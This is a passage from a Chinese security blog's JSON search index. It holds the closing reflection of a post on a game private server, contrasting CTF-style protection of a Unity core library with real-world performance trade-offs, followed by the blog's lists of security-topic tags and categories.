在研究这些原理之后，我感觉CTF和现实的差距真的挺大的，打CTF，出题人为了恶心你可以啥奇怪的手段都用上，但是在现实生活中，还需要考虑到用户的使用体验，而在这方面，安全性与可用性的平衡是防守方需要深思熟虑的地方，就比如u3d的核心lib2cpp.so，CTF可能会直接把buff加满，啥vmp，啥反调试都给安排上，但实际情况可能是加了过多的保护会降低游戏性能，防守方更多的则是通过一些手段来增加破解的复杂程度，比如把关键文件进行一些偏移或者异或之类的手段，或者是整点反常识的手段来误导攻击者… 挺有趣的qwq","link":"/2023/02/15/%E6%9F%90%E6%B8%B8%E7%A7%81%E6%9C%8D%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E8%BF%87%E9%AA%8C%E8%AF%81/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"ETH","slug":"ETH","link":"/tags/ETH/"},{"name":"Solidity","slug":"Solidity","link":"/tags/Solidity/"},{"name":"upload","slug":"upload","link":"/tags/upload/"},{"name":"Crypto","slug":"Crypto","link":"/tags/Crypto/"},{"name":"XOR","slug":"XOR","link":"/tags/XOR/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"复现","slug":"复现","link":"/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"phar","slug":"phar","link":"/tags/phar/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"inject","slug":"inject","link":"/tags/inject/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Troubleshooting","slug":"Troubleshooting","link":"/tags/Troubleshooting/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"备忘录","slug":"备忘录","link":"/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"},{"name":"Blockchain","slug":"Blockchain","link":"/tags/Blockchain/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"ssti","slug":"ssti","link":"/tags/ssti/"},{"name":"LFI","slug":"LFI","link":"/tags/LFI/"},{"name":"javascript","slug":"javascript","link":"/tags/javascript/"},{"name":"frida","slug":"frida","link":"/tags/frida/"},{"name":"MITM","slug":"MITM","link":"/tags/MITM/"}],"categories":[{"name":"备忘录","slug":"备忘录","link":"/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"},{"name":"复现","slug":"复现","link":"/categories/%E5%A4%8D%E7%8E%B0/"},{"name":"ssti","slug":"ssti","link":"/categories/ssti/"},{"name":"路由器","slug":"路由器","link":"/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/"},{"name":"weak","slug":"weak","link":"/categories/weak/"}]}